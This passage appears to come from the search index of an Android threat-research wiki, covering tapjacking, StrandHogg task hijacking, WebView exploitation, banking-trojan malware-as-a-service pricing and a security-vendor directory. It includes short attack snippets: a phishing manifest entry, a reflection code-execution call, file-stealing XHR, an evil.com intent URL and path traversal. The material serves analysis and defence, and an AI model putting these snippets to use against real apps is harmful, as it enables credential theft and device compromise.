<li>Scroll to find specific UI elements using <code>AccessibilityNodeInfo.ACTION_SCROLL_FORWARD</code></li> </ul> <p>This is strictly superior to tapjacking in every way. There is no timing dependency, no overlay to detect, and no user action to intercept. The only requirement is that the user has granted accessibility service permission to the malware, which is itself often obtained through tapjacking or overlay-guided social engineering -- creating a bootstrap chain where tapjacking enables the more powerful accessibility approach.</p> <p>Modern banking trojans (Anatsa, Xenomorph, Hook) use tapjacking or overlay guidance as a one-time step to obtain accessibility access, then switch entirely to <code>dispatchGesture()</code> and <code>AccessibilityNodeInfo</code> actions for all subsequent device manipulation. The overlay is the scaffolding; accessibility is the building.</p>"},{"location":"attacks/tapjacking/#testing-for-tapjacking-vulnerability","title":"Testing for Tapjacking Vulnerability","text":""},{"location":"attacks/tapjacking/#checking-app-level-protection","title":"Checking App-Level Protection","text":"<p>An app is vulnerable to tapjacking if its sensitive UI elements do not reject touches when an overlay is present. The defense is <code>filterTouchesWhenObscured</code>, which can be set per-view in XML or programmatically.</p> <p>In layout XML:</p> <pre><code>&lt;Button\n    android:filterTouchesWhenObscured=\"true\"\n    android:text=\"Confirm Payment\" /&gt;\n</code></pre> <p>Or in code:</p> <pre><code>button.setFilterTouchesWhenObscured(true);\n</code></pre> <p>Or by checking <code>MotionEvent.FLAG_WINDOW_IS_OBSCURED</code> in <code>onTouchEvent()</code> / <code>onFilterTouchEventForSecurity()</code>.</p> <p>To determine if an app is vulnerable, decompile the APK and search for these indicators. If none are present on security-sensitive views (payment confirmation, permission grants, login), the app is likely vulnerable.</p>"},{"location":"attacks/tapjacking/#testing-with-adb","title":"Testing with ADB","text":"<p>Create a test overlay without writing a full app:</p> <pre><code>adb shell settings put system show_touches 1\n</code></pre> <p>For a more thorough test, use a minimal overlay app or the <code>WindowManager</code> shell commands available on rooted devices. The steps:</p> <ol> <li>Install a simple overlay app (or use an existing screen dimmer/filter app)</li> <li>Activate the overlay so it covers the target app's UI</li> <li>Attempt to tap through the overlay onto sensitive buttons</li> <li>If the taps register, the app does not filter obscured touches</li> </ol>"},{"location":"attacks/tapjacking/#automated-detection-with-drozer","title":"Automated Detection with Drozer","text":"<pre><code>dz&gt; run app.activity.info -a com.target.app\n</code></pre> <p>Check for activities that handle sensitive actions and cross-reference with static analysis for <code>filterTouchesWhenObscured</code> usage. Drozer does not directly test tapjacking, but it identifies the attack surface (exported activities with sensitive functionality) that you then test manually with an overlay.</p>"},{"location":"attacks/tapjacking/#what-to-look-for","title":"What to Look For","text":"Indicator Verdict <code>filterTouchesWhenObscured=\"true\"</code> on all sensitive views Protected <code>onFilterTouchEventForSecurity()</code> override checking obscured flag Protected No obscured touch handling anywhere in the codebase Vulnerable <code>FLAG_WINDOW_IS_OBSCURED</code> check only on some views Partially vulnerable"},{"location":"attacks/task-affinity-attacks/","title":"Task Affinity Attacks","text":"<p>Manipulating Android's activity back stack to place a malicious activity inside a target app's task. The user believes they're interacting with the legitimate app because the malicious activity appears in its task and recent apps entry. Also known as \"StrandHogg\" after the vulnerability disclosure that popularized it.</p>"},{"location":"attacks/task-affinity-attacks/#requirements","title":"Requirements","text":"Requirement Details Permission None Condition Manifest configuration only"},{"location":"attacks/task-affinity-attacks/#how-task-affinity-works","title":"How Task Affinity Works","text":"<p>Every activity has a <code>taskAffinity</code> property (defaults to the app's package name). Activities with the same affinity are grouped into the same task. The task appears as a single entry in the Recent Apps screen.</p> <p>By default, all activities in an app share the same affinity and appear in one task. But an attacker's activity can declare affinity matching the target app:</p> <pre><code>&lt;activity\n    android:name=\".PhishingActivity\"\n    android:taskAffinity=\"com.target.banking.app\"\n    android:allowTaskReparenting=\"true\"\n    android:excludeFromRecents=\"true\" /&gt;\n</code></pre>"},{"location":"attacks/task-affinity-attacks/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/task-affinity-attacks/#strandhogg-v1","title":"StrandHogg (v1)","text":"<p>Disclosed in 2019 by Promon. Affects all Android versions.</p> <ol> <li>Malicious app launches with <code>taskAffinity</code> matching the target app</li> <li>Malicious activity is placed into the target's task stack</li> <li>When user opens the target app from recent apps or launcher, the malicious activity appears instead</li> <li>The malicious activity presents a phishing UI</li> </ol> <p>The attack uses <code>allowTaskReparenting=\"true\"</code>: the malicious activity starts in its own task but migrates to the target's task when the target is launched.</p>"},{"location":"attacks/task-affinity-attacks/#strandhogg-20-cve-2020-0096","title":"StrandHogg 2.0 (CVE-2020-0096)","text":"<p>Disclosed in 2020. Affected Android 8.0-9.0 (patched in May 2020 security update).</p> <p>An elevation of privilege vulnerability where a malicious app could take over any activity of any app. Unlike v1, the victim app doesn't need to be running. The malicious app could start any exported activity and intercept it, without the user noticing.</p>"},{"location":"attacks/task-affinity-attacks/#task-hijacking-for-phishing","title":"Task Hijacking for Phishing","text":"<p>Practical phishing scenario:</p> <ol> <li>Malware sets <code>taskAffinity=\"com.chase.sig.android\"</code></li> <li>User opens Chase banking app from launcher</li> <li>Instead of Chase, the malware's phishing activity appears</li> <li>User enters credentials</li> <li>Malware stores credentials and launches the real Chase activity</li> <li>User sees the real app and doesn't realize they were phished</li> </ol> <p>The Recent Apps screen shows the Chase icon and label, further selling the illusion.</p>"},{"location":"attacks/task-affinity-attacks/#relevant-manifest-attributes","title":"Relevant Manifest Attributes","text":"Attribute Effect <code>taskAffinity</code> Controls which task the activity belongs to <code>allowTaskReparenting</code> Activity can move between tasks <code>launchMode=\"singleTask\"</code> Creates new task if none with matching affinity exists <code>excludeFromRecents</code> Hides malicious activity from recent apps <code>documentLaunchMode</code> Controls document-based task creation"},{"location":"attacks/task-affinity-attacks/#android-mitigations","title":"Android Mitigations","text":"<p>Android 10 (API 29): patched StrandHogg v1 by restricting task affinity behavior for background-launched activities.</p> <p>May 2020 Security Patch: patched StrandHogg 2.0 (CVE-2020-0096).</p> <p>Android 12+: additional restrictions on background activity starts.</p> <p>Residual risk: on unpatched devices and with certain launch mode configurations, variations of this attack remain possible. The underlying task model hasn't fundamentally changed.</p>"},{"location":"attacks/task-affinity-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Look for:</p> <ul> <li>Activities with <code>taskAffinity</code> set to another app's package name</li> <li><code>allowTaskReparenting=\"true\"</code> combined with non-default affinity</li> <li><code>launchMode=\"singleTask\"</code> or <code>\"singleInstance\"</code> on suspicious activities</li> <li><code>excludeFromRecents=\"true\"</code> (hiding the malicious activity)</li> </ul>"},{"location":"attacks/task-affinity-attacks/#families-using-this-technique","title":"Families Using This Technique","text":"Family Usage Era BankBot Early adopter. Used <code>taskAffinity</code> + <code>allowTaskReparenting</code> to inject phishing activities into banking app tasks. 2016-2017 Anubis Combined task affinity with overlay attacks for layered credential theft. 2018 Gustuff Used task manipulation alongside accessibility-driven ATS for automated fund transfers. 2019 Cerberus Included task affinity phishing as one of multiple credential theft vectors. 2019-2020 <p>Task affinity attacks were the dominant phishing technique from 2014-2017. They were largely superseded by overlay attacks (which don't require task manipulation) and accessibility abuse (which provides broader device control). However, the underlying Android task model remains unchanged, and StrandHogg-style attacks still work on unpatched devices.</p>"},{"location":"attacks/task-affinity-attacks/#relationship-to-overlay-attacks","title":"Relationship to Overlay Attacks","text":"<p>Both task affinity attacks and overlay attacks achieve the same goal: presenting a fake UI over a legitimate app. The key difference:</p> Aspect Task Affinity Overlay Permission needed None <code>SYSTEM_ALERT_WINDOW</code> or Accessibility Android version All (with mitigations from 10+) All (with restrictions from 12+) Visibility Appears inside target app's task Floats above all apps Trigger User opens target app Malware detects target app launch Modern usage Rare Standard <p>The shift happened because overlays are more flexible (can trigger on any app launch, don't require prior task setup) and accessibility abuse provides far more capabilities beyond just phishing.</p>"},{"location":"attacks/webview-exploitation/","title":"WebView Exploitation","text":"<p>Abusing the WebView component to execute code, access local files, steal data, or bridge between web and native Android context. WebView is an embedded browser. When misconfigured, it gives web content access to native device capabilities.</p>"},{"location":"attacks/webview-exploitation/#requirements","title":"Requirements","text":"Requirement Details Permission None (exploits app misconfiguration) Condition Target app loads attacker-controlled URLs in a WebView or exposes JavaScript interfaces"},{"location":"attacks/webview-exploitation/#attack-surface","title":"Attack Surface","text":"<p>WebView inherits the app's permissions. If the host app has <code>READ_CONTACTS</code>, <code>CAMERA</code>, or <code>INTERNET</code>, JavaScript running in the WebView can potentially access those through exposed interfaces.</p>"},{"location":"attacks/webview-exploitation/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/webview-exploitation/#javascript-interface-abuse","title":"JavaScript Interface Abuse","text":"<p>Apps expose Java objects to JavaScript via <code>addJavascriptInterface()</code>:</p> <pre><code>webView.addJavascriptInterface(new MyBridge(), \"AndroidBridge\");\n</code></pre> <p>JavaScript in the WebView can call methods on <code>MyBridge</code>:</p> <pre><code>AndroidBridge.sendSMS(\"1234567890\", \"message\");\n</code></pre> <p>If the app loads attacker-controlled content into this WebView, the attacker's JavaScript calls the exposed methods directly.</p> <p>Pre-API 17 (Android 4.2): any public method on the interface object was callable, including <code>getClass()</code>. This enabled full arbitrary code execution via reflection:</p> <pre><code>AndroidBridge.getClass().forName(\"java.lang.Runtime\")\n    .getMethod(\"exec\", String.class)\n    .invoke(null, \"id\");\n</code></pre> <p>API 17+: only methods annotated with <code>@JavascriptInterface</code> are exposed. This closed the reflection path but exposed methods are still callable.</p>"},{"location":"attacks/webview-exploitation/#file-access","title":"File Access","text":"<p>WebView file access settings:</p> Setting Default Risk <code>setAllowFileAccess(true)</code> <code>true</code> (API &lt; 30), <code>false</code> (API 30+) Load <code>file://</code> URIs, read local files <code>setAllowFileAccessFromFileURLs(true)</code> <code>false</code> (API 16+) JavaScript in file:// pages can read other file:// <code>setAllowUniversalAccessFromFileURLs(true)</code> <code>false</code> (API 16+) JavaScript in file:// pages can access any origin <code>setAllowContentAccess(true)</code> <code>true</code> Load <code>content://</code> URIs <p>If an app loads <code>file:///data/data/com.target.app/shared_prefs/config.xml</code> in a WebView with file access enabled, JavaScript can read the content. Combined with XHR, files can be exfiltrated:</p> <pre><code>var xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"file:///data/data/com.target.app/shared_prefs/credentials.xml\", false);\nxhr.send();\nvar data = xhr.responseText;\n</code></pre>"},{"location":"attacks/webview-exploitation/#url-redirection-content-injection","title":"URL Redirection / Content Injection","text":"<p>If the app loads URLs from intent extras or deep link parameters:</p> <pre><code>String url = getIntent().getStringExtra(\"url\");\nwebView.loadUrl(url);\n</code></pre> <p>An attacker sends an intent with <code>url=https://evil.com/phishing.html</code>, and the WebView loads attacker content within the app's UI context. Users see the app's chrome (toolbar, navigation) around malicious content.</p>"},{"location":"attacks/webview-exploitation/#shouldoverrideurlloading-bypass","title":"<code>shouldOverrideUrlLoading</code> Bypass","text":"<p>Apps use <code>shouldOverrideUrlLoading()</code> to filter URLs. Common bypass patterns:</p> <ul> <li>URL encoding to evade string matching</li> <li>Redirects through allowed domains</li> <li>Fragment identifiers (<code>#</code>) to carry data past filters</li> <li>JavaScript-initiated navigation vs. user-initiated navigation (handled differently)</li> </ul>"},{"location":"attacks/webview-exploitation/#webresourceresponse-exploitation","title":"WebResourceResponse Exploitation","text":"<p>Apps that override <code>shouldInterceptRequest()</code> to serve local content via <code>WebResourceResponse</code> can be exploited for arbitrary file theft. Oversecured documented this attack class using Amazon app vulnerabilities as examples: if the app returns file contents based on URL parameters without path validation, an attacker can request internal files.</p> <pre><code>public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {\n    String path = request.getUrl().getPath();\n    File file = new File(getFilesDir(), path);\n    return new WebResourceResponse(\"text/html\", \"utf-8\", new FileInputStream(file));\n}\n</code></pre> <p>A request to <code>https://trusted.domain/../shared_prefs/credentials.xml</code> traverses out of the intended directory. Oversecured's file theft checklist covers systematic identification of these patterns.</p>"},{"location":"attacks/webview-exploitation/#loaddatawithbaseurl-abuse","title":"<code>loadDataWithBaseURL</code> Abuse","text":"<p>When an app uses <code>loadDataWithBaseURL()</code> with a privileged base URL, any JavaScript in the loaded HTML inherits origin access to that domain:</p> <pre><code>webView.loadDataWithBaseURL(\"https://trusted.domain\", htmlContent, \"text/html\", \"utf-8\", null);\n</code></pre> <p>If <code>htmlContent</code> comes from attacker-controlled input, the JavaScript runs in the context of <code>trusted.domain</code>, with access to its cookies and local storage. Oversecured demonstrated this in Evernote, achieving universal XSS and theft of all cookies from all sites by combining exported activity abuse with <code>loadDataWithBaseURL</code>.</p>"},{"location":"attacks/webview-exploitation/#cookie-theft","title":"Cookie Theft","text":"<p>WebView shares a cookie store via <code>CookieManager</code>. If an attacker can load content in the same WebView instance used for authenticated sessions, they can access session cookies:</p> <pre><code>document.cookie; // reads cookies for the current domain\n</code></pre> <p>If <code>setAllowUniversalAccessFromFileURLs(true)</code> is set, a file:// page can read cookies for any domain.</p> <p>Beyond JavaScript-based access, the WebView cookie database file itself (<code>/data/data/com.target.app/app_webview/Cookies</code>) can be stolen through content provider path traversal or file theft chains, providing offline access to all stored cookies without executing JavaScript.</p>"},{"location":"attacks/webview-exploitation/#ssl-pinning-bypass-via-webview","title":"SSL Pinning Bypass via WebView","text":"<p>WebView SSL errors can be overridden:</p> <pre><code>webView.setWebViewClient(new WebViewClient() {\n    @Override\n    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n        handler.proceed(); // accepts any certificate\n    }\n});\n</code></pre> <p>This enables MITM attacks on all WebView traffic within the app.</p>"},{"location":"attacks/webview-exploitation/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static analysis targets:</p> <ul> <li><code>addJavascriptInterface()</code> calls and what methods are exposed</li> <li><code>setAllowFileAccess(true)</code>, <code>setAllowFileAccessFromFileURLs(true)</code>, <code>setAllowUniversalAccessFromFileURLs(true)</code></li> <li>URL loading from untrusted input (intent extras, deep link parameters)</li> <li><code>onReceivedSslError</code> with <code>handler.proceed()</code></li> <li><code>setJavaScriptEnabled(true)</code> combined with any of the above</li> </ul> <p>Oversecured's WebView security checklist provides a systematic approach to auditing WebView configurations. 8kSec's deep link and WebView exploitation guide provides hands-on exploitation walkthroughs using the InsecureShop vulnerable app, covering URL validation bypass techniques (e.g., verifying authority vs. domain name suffix).</p>"},{"location":"attacks/webview-exploitation/#vendor-specific-webview-vulnerabilities","title":"Vendor-Specific WebView Vulnerabilities","text":"<p>OEM customizations introduce WebView attack surface beyond AOSP. Oversecured disclosed 7 Android and Pixel vulnerabilities including arbitrary file theft via WebView with default settings on stock Android devices. Their Xiaomi research found 20 security issues in Xiaomi system apps, several involving WebView misconfiguration in vendor-specific components. Oversecured's systematic audit of 225 Google apps revealed widespread WebView issues across Google's own app ecosystem.</p>"},{"location":"attacks/webview-exploitation/#malware-usage","title":"Malware Usage","text":"<p>Banking trojans heavily rely on WebView for overlay attacks. Overlay injects are typically HTML/JavaScript pages loaded in a WebView positioned over the target banking app. The WebView loads HTML/CSS/JS inject templates from C2, styled to match the target app's login screen.</p> Family WebView Usage Notes Cerberus Overlay injects 300+ inject templates loaded via WebView Anubis Overlay injects WebView injects + embedded keylogger Octo Overlay injects WebView overlays combined with screen streaming Hook Overlay injects 400+ targets, WebView injects from C2 GodFather Dynamic overlays WebView loads per-target HTML dynamically Ermac Overlay injects Inherited Cerberus WebView inject system Hydra Overlay injects 400+ target WebView templates Xenomorph Overlay injects + ATS WebView inject kits with credential phishing TsarBot Overlay injects 750+ target inject templates Antidot Multi-language overlays WebView injects in 18 languages Harly Invisible WebView Loads subscription pages in hidden WebView, auto-clicks subscription confirmation Joker Invisible WebView Hidden WebView navigates premium subscription flows BTMOB RAT Credential phishing WebView-based login phishing <p>Harly and Joker use an inverted approach: instead of showing WebViews to the user, they run invisible WebViews in the background to complete subscription fraud flows without user interaction.</p>"},{"location":"industry/","title":"Mobile Security Industry","text":"<p>The companies and organizations involved in Android security, from threat intelligence firms naming malware families to forensics companies extracting device data to the modding scene distributing repackaged APKs.</p> Page Content Security Companies Threat intel, endpoint security, app testing, AV engines, offensive research, forensics, packer vendors, third-party stores, modding scene"},{"location":"industry/#industry-structure","title":"Industry Structure","text":"<p>The mobile threat landscape is split across several roles that rarely overlap.</p> <p>Discovery. The initial sample surfaces through one of a few paths: a honeypot or crawler at a threat intel firm (ThreatFabric, Cleafy, Cyble), a Play Store audit by a vendor with scanner partnerships (Dr.Web, Kaspersky, ESET), a VirusTotal retrohunt, or a user complaint escalated through an AV vendor's telemetry pipeline. Academic groups and CERTs occasionally contribute first sightings, but rarely for banking trojans.</p> <p>Naming. Whoever publishes first picks the name. ThreatFabric named Cerberus, Alien, Ermac, Hook, and Octo. Cleafy named Copybara, BingoMod, and ToxicPanda. Kaspersky and ESET tend to publish under their own internal naming schemes, creating parallel nomenclatures. There is no central naming authority. The result is alias sprawl: Octo is also known as ExobotCompact, Coper is the same lineage as Octo v1, and Anatsa overlaps with TeaBot.</p> <p>Detection. AV engines on VirusTotal each assign their own signature strings. Google Play Protect runs its own classifier. None of these align with the research-community names. An analyst looking at a sample may see <code>Trojan-Banker.AndroidOS.Ermac</code> from Kaspersky, <code>Android/Spy.Cerberus</code> from ESET, and <code>Artemis!{hash}</code> from McAfee, all for the same APK.</p> <p>Response. Takedowns are rare for Android malware. Law enforcement has only intervened in a handful of cases (see key events below). Most \"response\" is Google pulling apps from the Play Store after a vendor publishes, sometimes weeks or months after initial discovery.</p>"},{"location":"industry/#how-malware-gets-named","title":"How Malware Gets Named","text":"<p>The naming lifecycle works roughly as follows:</p> <ol> <li>Sample acquisition. A researcher obtains an APK through a dropper on Play Store, a phishing SMS campaign, a C2 panel crawl, or VirusTotal hunting rules (YARA/VT Intelligence).</li> <li>Triage and clustering. The sample is decompiled, and its code structure, C2 protocol, overlay injection pattern, and string artifacts are compared against known families. If it does not match, it is a candidate for a new family name.</li> <li>Naming and publication. The discovering firm publishes a blog post with the chosen name, IOCs (hashes, C2 domains), and a technical breakdown. This becomes the de facto name.</li> <li>VirusTotal propagation. Other engines gradually pick up the sample. Each assigns its own detection label. There is no standard mapping.</li> <li>Cross-vendor drift. Over time, forks and rebrands compound the confusion. Cerberus source leaked and spawned Alien, which spawned Ermac, which spawned Hook. Each got a separate name despite sharing large portions of code. Malpedia and ThreatFabric's threat tracker are the closest things to a canonical mapping, but neither is exhaustive.</li> </ol>"},{"location":"industry/#maas-economy","title":"MaaS Economy","text":"<p>Most active Android banking trojans operate as Malware-as-a-Service. The operator (threat actor deploying the malware against victims) rents access from the developer (threat actor who wrote and maintains the bot). This is a subscription business.</p>"},{"location":"industry/#whats-sold","title":"What's Sold","text":"<p>A standard MaaS package includes:</p> <ul> <li>Admin panel. Web-based C2 dashboard for managing bots, pushing commands, configuring inject targets, and viewing stolen credentials.</li> <li>Inject kit. A library of HTML overlay pages that mimic banking apps. Sold per-region or as a full global set. Some sellers offer custom inject creation as an upsell.</li> <li>Builder / APK generator. Allows the operator to produce new APK variants with unique signing keys, package names, and obfuscation profiles.</li> <li>Support channel. Private Telegram group or forum thread where the developer provides updates, troubleshooting, and feature announcements.</li> <li>Updates. Ongoing patches for detection evasion, new Android version compatibility, and feature additions (VNC, keylogging, SMS forwarding, push notification interception).</li> </ul>"},{"location":"industry/#pricing","title":"Pricing","text":"<p>Prices are quoted from underground advertisements and open-source reporting. Monthly rental is the standard model, though some offer lifetime or per-build pricing.</p> Family Price Notes Cerberus $4,000/month Sold 2019-2020, source code auctioned then leaked free in Sept 2020 Hook $7,000/month Premium tier, VNC and RAT capabilities, advertised by DukeEugene Ermac $3,000/month Same developer lineage as Cerberus/Alien, sold on darknet forums Octo $2,000/month Also sold as Octo2 with upgraded C2 encryption, DGA BTMOB $5,000-$10,000 Higher price point, newer entrant Albiriox $650-$720/month Budget tier, lower feature set <p>Price correlates loosely with feature maturity, evasion quality, and the developer's reputation. Leaks and law enforcement actions crash prices overnight. After the Cerberus source leak, the entire market adjusted downward temporarily because operators could fork Cerberus for free.</p>"},{"location":"industry/#distribution-channels","title":"Distribution Channels","text":"<p>MaaS listings and operator coordination happen on:</p> <ul> <li>Telegram channels. Primary distribution vector since 2020. Developers run private channels for customer support and public channels for advertisements. Some families (Hook, Ermac) were advertised almost exclusively through Telegram.</li> <li>XSS Forum. Russian-language cybercrime forum. Long-running threads for Cerberus, Ermac, and Octo sales. Requires vetting for membership.</li> <li>Exploit.in. Another Russian-language forum with active Android malware vendor sections.</li> <li>Breached.to (formerly RaidForums successor). English-language forum where leaked source code and cracked panels surface. Lower operational security, more likely to attract less sophisticated operators.</li> </ul> <p>Inject kits circulate separately from the bot itself. A thriving secondary market exists for regional overlay packs targeting specific banks, crypto exchanges, and payment apps.</p>"},{"location":"industry/#key-industry-events","title":"Key Industry Events","text":"<p>A short list of events that materially changed the Android threat landscape.</p> <p>Cerberus source leak (September 2020). After failing to auction the Cerberus source code, the developer released it for free on underground forums. This single event seeded multiple successor families: Alien, Ermac, and eventually Hook. It lowered the barrier to entry for new operators and flooded the ecosystem with Cerberus-derived variants that persist today.</p> <p>FluBot takedown by Europol (June 2022). Europol's Dutch-led operation seized FluBot's infrastructure across 11 countries. One of the few successful law enforcement actions against a mobile malware operation. FluBot had been one of the most aggressive SMS-worm-style Android threats in Europe. The takedown was effective: FluBot did not resurface.</p> <p>FinFisher bankruptcy (2022). FinFisher GmbH, developer of the FinSpy commercial spyware suite, filed for insolvency after years of legal pressure and investigations into sales to authoritarian regimes. Signaled that commercial spyware vendors face real legal risk, at least in EU jurisdictions.</p> <p>Intellexa sanctions (March 2024). The US Treasury sanctioned Intellexa Consortium entities and individuals behind the Predator spyware. First financial sanctions specifically targeting a commercial spyware vendor. Intellexa's operations fragmented but did not fully cease, with infrastructure rotating through new hosting providers.</p>"},{"location":"industry/security-companies/","title":"Mobile Security Industry","text":"<p>The mobile security industry has distinct segments. Understanding who operates where helps when reading reports, evaluating tools, and recognizing whose perspective shapes the research.</p>"},{"location":"industry/security-companies/#threat-intelligence-malware-research","title":"Threat Intelligence / Malware Research","text":"<p>Companies that discover, analyze, and name mobile malware families. Their reports are primary sources.</p> Company Focus Notable For Avast Threat Labs Consumer + research Avast Decoded blog. Android adware, Play Store threats, Cerberus analysis. CheckPoint Research Broad security research CPR publishes Android malware campaigns, Play Store threat analysis. Rafel RAT discovery (120+ campaigns). FluHorse (Flutter-based stealer). Cisco Talos Broad threat intelligence Gustuff analysis. Predator deep-dive (Python implant architecture). Citizen Lab Digital surveillance research University of Toronto. Pegasus, Predator, FinSpy tracking. Cleafy Financial fraud, mobile banking Detailed banking trojan reports. Copybara, Anatsa, BRATA, ToxicPanda, SharkBot, PixPirate, BingoMod, Klopatra, Albiriox. CYFIRMA External threat landscape management FireScam discovery (fake RuStore/Telegram Premium info-stealer). Cyble Dark web intelligence + mobile CRIL (Cyble Research and Intelligence Labs). Chameleon, GodFather v2, TsarBot, Antidot, TrickMo, Gigabud, BTMOB RAT, DeVixor. ESET Broad antivirus + research Regular Android publications. FinSpy devirtualization. NGate NFC relay discovery. FurBall, SpyAgent. Fortinet FortiGuard Labs Broad threat intelligence Android malware write-ups, BankBot analysis. Google TAG State-sponsored threat tracking Tracks commercial spyware. Predator exploit chains, Hermit analysis. Group-IB Threat intelligence, fraud prevention GodFather, Gustuff discovery. APT-level mobile tracking. HUMAN Security (Satori) Bot/fraud intelligence Harly analysis. Mobile fraud research. IBM Security Trusteer Financial fraud PixPirate analysis. Banking fraud intelligence. Kaspersky Broad threat intelligence Long Android malware history. Triada, Harly, BRATA, Roaming Mantis, LightSpy (initial iOS disclosure). Lookout Mobile-focused threat intel Pegasus (Chrysaor), Hermit discovery. KoSpy DPRK spyware, GuardZoo Houthi surveillance. BoneSpy/PlainGnome Sandcat spyware. EagleMsgSpy Chinese lawful intercept. LightSpy (DragonEgg attribution). DCHSpy MuddyWater Iranian surveillanceware. McAfee Mobile Research Mobile malware, adware, PUPs Part of McAfee Labs. BRATA, Vultur analysis. Mobile threat reports. NCC Group / Fox-IT Offensive security + research SharkBot, Ermac/Hook lineage analysis. FluBot DGA research. PRODAFT Threat intelligence FluBot infrastructure analysis. Underground forum monitoring. Proofpoint Email/messaging threats TangleBot (Medusa) naming. Mobile phishing campaigns. Sophos Cross-platform threats X-Ops team publishes Android malware analysis. FluBot, PJobRAT Taiwan campaign. ThreatFabric Android banking trojans Most prolific Android malware research. Named Cerberus, Anatsa, Hook, Ermac, Xenomorph, Medusa, Vultur, Octo, Alien, Brokewell, Crocodilus, Herodotus, Sturnus, RatOn. LightSpy DragonEgg-to-LightSpy link. Trend Micro Enterprise threats TgToxic discovery. Mobile ransomware, spyware. Zimperium Mobile threat defense GriftHorse discovery. Hook v3, GodFather v3 analysis. Gigabud+SpyNote infrastructure mapping. zLabs research. Zscaler ThreatLabz Cloud security + research Copybara MQTT analysis, Anatsa Play Store campaigns."},{"location":"industry/security-companies/#mobile-endpoint-security","title":"Mobile Endpoint Security","text":"<p>Detection and prevention products running on devices or managing device fleets.</p> Company Product Type Notes CrowdStrike EDR with mobile Falcon for Mobile. Extends endpoint detection to Android/iOS. Lookout Mobile endpoint security Enterprise MDM + threat detection. Acquired by F5. Microsoft Defender Cross-platform Defender for Endpoint includes Android device management. Pradeo Mobile fleet security App analysis and device protection. Samsung Knox Platform security Hardware-backed isolation. Enterprise security platform. Zimperium Mobile threat defense (MTD) On-device ML detection. zIPS for enterprise. z9 engine."},{"location":"industry/security-companies/#app-security-testing-sastdast","title":"App Security Testing (SAST/DAST)","text":"<p>Finding vulnerabilities in Android apps.</p> Company Focus Notes Guardsquare Protection (DexGuard) + testing (AppSweep) Both sides: packer vendor and security testing. Contributes to ProGuard/R8. NowSecure Mobile app security testing Automated SAST/DAST. OWASP MASVS testing. Blog covers practical mobile security. Oversecured Automated Android/iOS vuln scanning Founded by Sergey Toshin. 225+ Google app vulnerabilities. Top blog in the space. Promon App shielding (RASP) Runtime protection. Discovered StrandHogg (task affinity attack). Quixxi App security Mobile app security platform, vulnerability scanning."},{"location":"industry/security-companies/#av-engines-android-detection","title":"AV Engines (Android Detection)","text":"<p>Their detection names appear in VirusTotal. For detailed detection name formats and cross-vendor mapping, see Naming Conventions.</p>"},{"location":"industry/security-companies/#primary-engines-best-android-coverage","title":"Primary Engines (Best Android Coverage)","text":"Engine Detection Name Format Notes Avast/AVG <code>Android:Family-X [Trj]</code> Same engine (Avast acquired AVG). Strong mobile. Bitdefender <code>Android.Trojan.Banker.XX</code> Licensed by eScan, GData, Emsisoft, VIPRE, Arcabit. DrWeb <code>Android.BankBot.NNNNN</code> Numeric IDs. Popular in CIS countries. Good mobile coverage. ESET-NOD32 <code>Android/Spy.Banker.XXX</code> Consistent naming. Research-backed signatures. Fortinet <code>Android/Family.A!tr</code> Good mobile coverage, suffix indicates type. Kaspersky <code>HEUR:Trojan-Banker.AndroidOS.Family.x</code> Best Android heuristic detection. Prefixes: HEUR, UDS, PDM. McAfee <code>Android/Family.X</code> or <code>Artemis!HASH</code> \"Artemis\" = generic cloud ML detection. Microsoft <code>Trojan:AndroidOS/Family.A!MTB</code> Growing Android coverage. Sophos <code>Andr/Family-X</code> Consistent <code>Andr/</code> prefix. Symantec/Broadcom <code>Trojan.Gen.MBT</code> Often generic, poor family attribution. Trend Micro <code>AndroidOS_Family.VARIANT</code> Enterprise-focused."},{"location":"industry/security-companies/#mobile-specific-engines","title":"Mobile-Specific Engines","text":"Engine Notes AhnLab-V3 Korean. <code>Trojan/Android.Banker.NNNNNN</code>. Strong on Asian malware. Avast-Mobile Mobile-dedicated scanner. BitDefenderFalx Bitdefender's mobile engine. Symantec Mobile Insight Broadcom's mobile engine. Often generic verdicts. Trustlook Mobile-focused behavioral detection."},{"location":"industry/security-companies/#edr-next-gen-limited-family-attribution","title":"EDR / Next-Gen (Limited Family Attribution)","text":"Engine Notes CrowdStrike Falcon Behavioral, often no family name. DeepInstinct Binary ML verdict only. Palo Alto Networks ML-based, usually no family name. SentinelOne (Static ML) Binary verdict: \"Static AI - Malicious APK\". Elastic Community rules."},{"location":"industry/security-companies/#regional-engines","title":"Regional Engines","text":"Engine Region Notes Alibaba / AliCloud China <code>TrojanBanker:Android/Family.HASH</code> Antiy-AVL China <code>Trojan/Android.Banker.family</code> Baidu China <code>Android.Trojan.Bank.XX</code> Huorong China Endpoint security. Jiangmin China <code>TrojanBanker.AndroidOS.xx</code> Kingsoft China <code>Android.Troj.Family.x</code> Rising China <code>Trojan.Banker/Android!version</code> Tencent China <code>A.privacy.family.x</code> ALYac Korea Uses Bitdefender engine. TACHYON Korea <code>Trojan-Android/Family</code> ViRobot Korea <code>Android.Family.X</code> Bkav Pro Vietnam Limited mobile coverage. K7AntiVirus / K7GW India Numeric hash-based names. QuickHeal India <code>Android.Family.GEN</code> Ikarus Austria <code>Trojan-Banker.AndroidOS.Family</code>. Zillya Ukraine <code>Trojan.Banker.Android.NNNNN</code> Yandex Russia <code>Trojan.AndroidOS.Family</code>"},{"location":"industry/security-companies/#offensive-security-research","title":"Offensive Security / Research","text":"<p>Organizations doing Android security research from an offensive or research perspective.</p> Company Focus Notes 8kSec Mobile security training + research Battlegrounds CTF platform. Blog covers app and kernel Android security. Google Android Red Team Internal offensive security androidoffsec.withgoogle.com. Kernel exploitation, fuzzing. Google Project Zero 0-day research Top-tier exploit chain research. Android kernel, Binder, codecs. Trellix (formerly FireEye Mobile) Advanced threat research Mobile APT tracking, nation-state campaigns. WithSecure (F-Secure) Pentesting tools Maintains Drozer (Android assessment tool)."},{"location":"industry/security-companies/#digital-forensics","title":"Digital Forensics","text":"<p>Mobile forensics tools used by law enforcement, incident response, and intelligence.</p> Company Product Notes Cellebrite UFED, Physical Analyzer Market leader in mobile forensics. Physical extraction, app data parsing. Grayshift GrayKey iPhone and Android device unlocking. Law enforcement focused. Magnet Forensics AXIOM Cross-platform digital forensics including mobile. 